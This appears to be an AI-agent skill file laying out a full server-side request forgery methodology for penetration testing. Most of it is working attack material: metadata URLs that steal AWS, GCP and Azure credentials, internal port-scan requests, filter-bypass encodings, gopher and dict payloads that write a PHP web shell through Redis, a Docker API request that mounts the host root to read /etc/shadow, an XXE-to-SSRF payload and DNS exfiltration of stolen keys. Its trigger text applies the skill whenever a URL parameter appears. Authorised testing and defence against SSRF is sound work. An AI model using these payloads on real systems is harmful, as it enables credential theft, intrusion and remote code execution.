---
name: ssrf-hunter
description: Complete SSRF detection and exploitation methodology injection point discovery, cloud metadata theft (AWS/GCP/Azure), internal network enumeration, protocol handler abuse, filter bypass techniques, blind SSRF via OOB, and report structure. Trigger when the user sees any parameter that accepts a URL, hostname, IP, or path, wants to check if a server fetches external resources, is testing cloud-hosted applications for metadata endpoint access, or wants to probe internal services through a compromised SSRF point.
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["ssrf", "pentest", "web", "cloud", "exploitation"]
---

# SSRF Hunter

Server-Side Request Forgery occurs when a server fetches a user-controlled URL, allowing attackers to reach internal services, cloud metadata, and resources behind firewalls that are otherwise inaccessible.

---

## Phase 1 — Find Injection Points

SSRF lives anywhere the application fetches a remote resource based on user input. Cast a wide net.

### 1.1 Obvious URL Parameters
```
GET /fetch?url=https://example.com
GET /proxy?target=https://example.com
GET /preview?link=https://example.com
POST /webhook { "callback": "https://example.com" }
```

### 1.2 Less Obvious Parameters
- File import / export: `?source=`, `?file=`, `?import=`, `?load=`
- PDF / image rendering: `?pdf_url=`, `?screenshot=`, `?thumbnail=`
- OAuth / redirect flows: `redirect_uri=`, `next=`, `return_to=`
- XML body: `<url>`, `<src>`, `<href>` — also check for XXE with SSRF
- Referrer header processing
- Custom headers: `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`
- Archive / sitemap crawlers: `?sitemap=`, `?feed=`
- Integration webhooks (Slack, Jira, CI/CD)

### 1.3 Non-URL Parameters That May Trigger Fetches
- Hostname: `?host=internal.server`
- IP + Port: `?ip=10.0.0.1&port=6379`
- Document ID that resolves to a path remotely

---

## Phase 2 — Confirm SSRF (Baseline)

Use an OOB callback to detect blind SSRF before testing anything sensitive.

```
# Use Burp Collaborator, interactsh, or canarytokens.org
GET /fetch?url=https://YOUR-COLLABORATOR-ID.oastify.com
```

**What to look for:**
- DNS lookup hit on your callback → SSRF confirmed (DNS only, likely blind)
- HTTP request hit → full SSRF confirmed
- No hit + no error → blocked, move to bypasses
- 200 with response body → non-blind SSRF, most impactful

**Response analysis:**
| Response | Interpretation |
|---|---|
| 200 + internal content | Non-blind SSRF, confirmed |
| 200 + empty or error page | Possible SSRF, content filtered |
| 502 Bad Gateway | Server reached target but got an error — SSRF exists |
| Timeout (no 5xx) | Firewall blocking outbound, or target unreachable |
| Connection refused | Server attempted the request, port closed |
| DNS hit on OOB, no HTTP | Blind SSRF (DNS only) |

---

## Phase 3 — Cloud Metadata Exploitation

If confirmed, go straight for credentials. See `references/metadata-endpoints.md` for full URL list.

### AWS IMDSv1 (no auth required)
```
# Enumerate roles
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Steal credentials (replace ROLE-NAME with the role returned above)
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```
Response contains `AccessKeyId`, `SecretAccessKey`, `Token` → full AWS API access.

### AWS IMDSv2 (token required — two requests)
```
# Step 1: get token
GET /fetch?url=http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: use token
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
Header: X-aws-ec2-metadata-token: TOKEN
```
If the app strips or doesn't forward custom headers, IMDSv2 may block you — check if the app has a header forwarding mechanism.

### GCP
```
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```

### Azure
```
GET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Managed identity token
GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

---

## Phase 4 — Internal Network Enumeration

### 4.1 Port Scan via SSRF
```
GET /fetch?url=http://127.0.0.1:22/    → SSH
GET /fetch?url=http://127.0.0.1:3306/  → MySQL
GET /fetch?url=http://127.0.0.1:5432/  → PostgreSQL
GET /fetch?url=http://127.0.0.1:6379/  → Redis
GET /fetch?url=http://127.0.0.1:9200/  → Elasticsearch
GET /fetch?url=http://127.0.0.1:27017/ → MongoDB
GET /fetch?url=http://127.0.0.1:8500/  → Consul
GET /fetch?url=http://127.0.0.1:2375/  → Docker API (unauthenticated)
GET /fetch?url=http://127.0.0.1:10250/ → Kubernetes kubelet
```
Use timing and response size differences to distinguish open from closed ports.
For automation: `python scripts/ssrf_agent.py --target-url https://app/fetch?url= --internal-ip 10.0.0.1`

### 4.2 High-Value Internal Targets
```
http://localhost/server-status               → Apache status
http://localhost:8080/manager/html           → Tomcat manager
http://localhost:2375/v1.24/containers/json  → Docker API
http://localhost:10255/pods                  → Kubernetes kubelet (read-only)
http://localhost:8500/v1/agent/self          → Consul
http://localhost:9200/_cat/indices           → Elasticsearch
```

---

## Phase 5 — Protocol Handler Abuse

If the application doesn't restrict URL schemes:

```
file:///etc/passwd                       → Local file read
file:///proc/self/environ                → Environment variables (often has secrets)
file:///var/www/html/config.php          → App config files
gopher://127.0.0.1:6379/_INFO%0d%0a     → Redis command injection
dict://127.0.0.1:6379/INFO              → Redis via dict protocol
gopher://127.0.0.1:25/_EHLO%20localhost → SMTP internal relay
```

**Gopher → Redis RCE (no auth):**
Use `gopherus` to generate payloads for Redis, MySQL, SMTP, FastCGI:
```bash
gopherus --exploit redis
```

---

## Phase 6 — Filter Bypass Techniques

When a WAF or allowlist blocks direct `169.254.169.254`:

### IP Encoding
```
http://2852039166/           → Decimal
http://0xa9fea9fe/           → Hex
http://0251.0376.0251.0376/  → Octal
http://[::ffff:169.254.169.254]/   → IPv6 mapped
http://169.254.169.254.nip.io/    → DNS-based (resolves after filter check)
```

### Localhost Aliases
```
http://localhost/   http://0/   http://0.0.0.0/   http://127.1/
```

### Redirect Chain
Host an open redirect on a whitelisted domain:
```
GET /fetch?url=https://allowed-domain.com/redirect?to=http://169.254.169.254/
```

### DNS Rebinding
Domain initially resolves to allowlisted IP, rebinds to `169.254.169.254` after TTL.
Tool: [singularity](https://github.com/nccgroup/singularity)

### URL Confusion
```
http://evil.com\@169.254.169.254/
http://allowed.com:80@169.254.169.254/
http://169.254.169.254%09/
http://169.254.169.254%00allowed.com/
```

---

## Phase 7 — Blind SSRF Escalation

When you only get OOB hits and no response body:

1. **Timing-based port scan** — open ports respond faster than filtered
2. **DNS exfiltration** — encode stolen data in subdomains: `http://STOLEN.your-collab.net/`
3. **Chain with other bugs** — blind SSRF + log injection → LFI → logs → RCE
4. **IMDSv1 credential exfil** — even blind, exfiltrate AWS creds via DNS-encoded subdomains
5. **Find reflection points** — error messages, redirect Location headers, or timing that leaks fetched content

---

## Phase 8 — Automation

```bash
pip install requests

# Full scan: metadata + port scan + bypasses + protocol handlers
python scripts/ssrf_agent.py --target-url https://app.example.com/fetch?url= --output ssrf_report.json

# Custom internal IP
python scripts/ssrf_agent.py --target-url https://app.example.com/fetch?url= --internal-ip 10.0.0.1
```

---

## Phase 9 — Report Structure

```
Title: SSRF on [endpoint] allows [cloud metadata theft / internal service access / file read]

Severity: [Critical / High / Medium]

Affected endpoint: [METHOD] [URL]

Steps to reproduce:
1. Send: [exact HTTP request]
2. Observe: [what was returned]

Impact:
- [e.g. "AWS IAM credentials leaked — AccessKeyId: AKIA..., full S3/EC2 access"]
- [or "Internal Redis at 127.0.0.1:6379 accessible, unauthenticated"]

Evidence:
- Request: [redacted HTTP request]
- Response: [snippet showing proof — credential fields, banner, internal response]

Remediation:
- Validate and allowlist outbound URLs server-side — block RFC 1918 and link-local (169.254.x.x)
- Enforce IMDSv2 and disable IMDSv1 at the cloud firewall level
- Restrict outbound HTTP to required domains via egress firewall
- Reject non-HTTP(S) schemes (file://, gopher://, dict://)
- Do not return raw fetched content to the user
```

---

## Quick Priority Order

1. **Cloud metadata** (169.254.169.254) — always first, Critical if accessible
2. **Internal Docker / Kubernetes APIs** — unauthenticated daemon = instant RCE
3. **Redis / database ports** — no-auth services = data access or RCE via gopher
4. **file://** — env vars, config files, secrets
5. **Internal admin panels** (Tomcat, Consul, Elasticsearch)
6. **Blind SSRF** — lower severity, worth chaining

---

## From hack-skills: Extended SSRF Techniques

### SSRF Surface Parameters
```
loc=  url=  path=  endpoint=  imageUrl=  dest=  redirect=
uri=  callback=  load=  file=  resource=  link=  src=  data=  ref=
```

**Less obvious SSRF vectors:**
- PDF/screenshot generators (URL to capture)
- Webhook configuration fields
- Import via URL (CSV import, RSS/Atom feeds)
- XML `DOCTYPE` with external entity (`file://`, `http://`)
- GraphQL `@link` directive (federation)
- `X-Forwarded-Host` / `X-Real-IP` in proxy chains

### SSRF+FILTER Bypass Decision Tree
```
SSRF found → try http://169.254.169.254/ → blocked?
├── Decimal: http://2852039166/
├── Hex:     http://0xa9fea9fe/
├── Octal:   http://0251.0376.0251.0376/
├── IPv6:    http://[::ffff:169.254.169.254]/
└── DNS rebind: 169.254.169.254.nip.io

Try http://127.0.0.1/ → blocked?
├── http://127.1/  http://127.0.1/  http://0x7f000001/
├── http://2130706433/  http://0177.1/
├── http://localhost/  http://[::1]/
└── http://0.0.0.0/

Protocols allowed?
├── dict:// → Redis: dict://127.0.0.1:6379/INFO
├── gopher:// → full TCP injection (Redis/SMTP/MySQL)
├── file:// → local file read
└── sftp:// ldap:// ftp:// → network interactions
```

### URL Confusion Filter Bypass
```
http://evil.com\@169.254.169.254/      → backslash confusion
http://allowed.com:80@169.254.169.254/ → userinfo@host confusion
http://169.254.169.254%09/             → tab-encoded
http://169.254.169.254%00allowed.com/  → null byte truncation
http://target.com/redirect?url=http://169.254.169.254/  → open redirect chain
```

### Internal Service Exploitation
```bash
# Docker API (unauthenticated on :2375)
http://127.0.0.1:2375/v1.24/containers/json     → list containers
http://127.0.0.1:2375/v1.24/images/json          → list images
# Create privileged container for host escape:
POST http://127.0.0.1:2375/v1.24/containers/create
{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}

# Elasticsearch (9200 no-auth default)
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/.kibana/_search
http://127.0.0.1:9200/INDEX_NAME/_search?q=*

# Redis via dict://
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>
dict://127.0.0.1:6379/BGSAVE
```

### Application-Layer SSRF via XML (XXE-SSRF chain)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request>&xxe;</request>
```

### SSRF-Filter Mindset
Developers often filter only specific strings — test all these gaps:
- Block `169.254.169.254` but not IPv6 equivalent `[::ffff:169.254.169.254]`
- Block `127.0.0.1` but not `127.1` or `localhost`  
- Block direct IPs but not DNS names resolving to them
- Block the target but follow 302 redirects to it
- Block at URL-parse level but allow DNS-resolved result
